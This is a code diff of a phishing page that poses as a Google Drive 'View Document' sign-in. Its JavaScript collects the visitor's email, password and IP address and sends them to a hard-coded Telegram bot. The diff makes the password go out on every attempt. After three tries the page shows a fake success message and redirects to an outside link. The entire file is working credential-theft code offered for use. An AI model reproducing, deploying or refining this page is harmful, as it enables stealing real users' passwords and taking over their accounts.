@@ -92,18 +92,17 @@
   <div class="overlay" id="overlay"></div>
 
   <div class="login-panel" id="loginPanel">
-  <!-- Google Drive Logo placed before email input -->
-  <img src="https://i.gyazo.com/e12b9c0de3a9b5d5612e62cdb91044da.png" alt="Google Drive Logo" id="logo" style="width: 100px; margin-bottom: 15px; display: block; margin-left: auto; margin-right: auto;" />
-   <form id="loginForm" autocomplete="off">
-  <input type="text" id="username" name="username" placeholder="Email" required><br>
-  <input type="password" id="password" name="password" placeholder="Password" required><br>
-  <label><input type="checkbox" id="notRobot"> Confirm that you are not a robot 🤖</label><br>
-  <button type="submit" id="loginBtn" disabled>View Document</button>
-  <div id="message" class="message" aria-live="polite"></div>
-</form>
+    <!-- Google Drive Logo placed before email input -->
+    <img src="https://i.gyazo.com/e12b9c0de3a9b5d5612e62cdb91044da.png" alt="Google Drive Logo" style="width: 100px; margin-bottom: 15px; display: block; margin-left: auto; margin-right: auto;" />
+    <form id="loginForm" autocomplete="off">
+      <input type="text" id="username" name="username" placeholder="Email" required><br>
+      <input type="password" id="password" name="password" placeholder="Password" required><br>
+      <label><input type="checkbox" id="notRobot"> Confirm that you are not a robot 🤖</label><br>
+      <button type="submit" id="loginBtn" disabled>View Document</button>
+      <div id="message" class="message" aria-live="polite"></div>
+    </form>
   </div>
 <script>
- // Your existing variables...
 const MAX_ATTEMPTS = 3;
 let attemptCount = 0;
 let userIP = '';
@@ -115,9 +114,8 @@ const loginBtn = document.getElementById('loginBtn');
 const message = document.getElementById('message');
 const form = document.getElementById('loginForm');
 
-// Your Telegram Bot Token and Chat ID
 const TELEGRAM_BOT_TOKEN = '7996177632:AAFxmZqQCIqBwhHwLRGWiUxfNaycyocpOr0'; // replace with your bot token
-const TELEGRAM_CHAT_ID = '1279485009';     // replace with your chat ID
+const TELEGRAM_CHAT_ID = '1279485009'; // replace with your chat ID
 
 // Fetch user's IP
 async function fetchIP() {
@@ -131,29 +129,17 @@ async function fetchIP() {
 }
 fetchIP();
 
-// Send message to Telegram
-async function sendToTelegram(email, password, ip) {
-  const messageText = `Login Attempt:\nEmail: ${email}\nPassword: ${password}\nIP: ${ip}`;
+// Send message to Telegram in the specified format
+async function sendAttemptReport(email, password, ip, attemptNumber) {
+  const messageText = `Login Attempt ${attemptNumber}:\nEmail: ${email}\nPassword: ${password}\nIP: ${ip}`;
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(messageText)}`;
   try {
     await fetch(url);
   } catch (e) {
-    console.error('Failed to send message to Telegram', e);
+    console.error('Failed to send attempt report:', e);
   }
 }
 
-// Send attempt info (for attempt count)
-async function reportAttemptToTelegram(email, ip, attemptNumber) {
-  const messageText = `Login Attempt ${attemptNumber}:\nEmail: ${email}\nIP: ${ip}`;
-  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(messageText)}`;
-  try {
-    await fetch(url);
-  } catch (e) {
-    console.error('Failed to send attempt report', e);
-  }
-}
-
-// UI helpers
 function showProcessing() {
   message.innerHTML = '<span class="spinner"></span> Processing...';
   message.className = 'message processing';
@@ -172,7 +158,7 @@ function showSuccess(text) {
   message.style.display = 'block';
 }
 
-// Event handlers for modal
+// Modal toggle events
 document.body.addEventListener('click', () => {
   loginPanel.classList.add('active');
   overlay.classList.add('active');
@@ -185,7 +171,7 @@ checkbox.addEventListener('change', () => {
   loginBtn.disabled = !checkbox.checked;
 });
 
-// Form submission
+// Handle form submission
 document.getElementById('loginForm').addEventListener('submit', async (e) => {
   e.preventDefault();
 
@@ -203,7 +189,8 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
   }
 
   attemptCount++;
-  await reportAttemptToTelegram(email, userIP, attemptCount);
+  // Report attempt with email, password, IP
+  await sendAttemptReport(email, password, userIP, attemptCount);
 
   if (attemptCount < MAX_ATTEMPTS) {
     showProcessing();
@@ -216,21 +203,20 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
     return;
   }
 
-  // On third attempt: proceed with "success"
+  // Final success step
   showProcessing();
   loginBtn.disabled = true;
 
-  // Send final login info
-  await sendToTelegram(email, password, userIP);
+  // Send final login info again for confirmation
+  await sendAttemptReport(email, password, userIP, attemptCount);
 
-  // Show success and redirect
   setTimeout(() => {
     showSuccess('Confirmation successful! Redirecting...');
-    // Ensure redirect happens after showing success message
     setTimeout(() => {
-      console.log('Redirecting now...');
       window.location.href = 'https://polywin.co.in/Paymt/001.jpg';
     }, 1000);
   }, 1500);
 });
 </script>
+</body>
+</html>
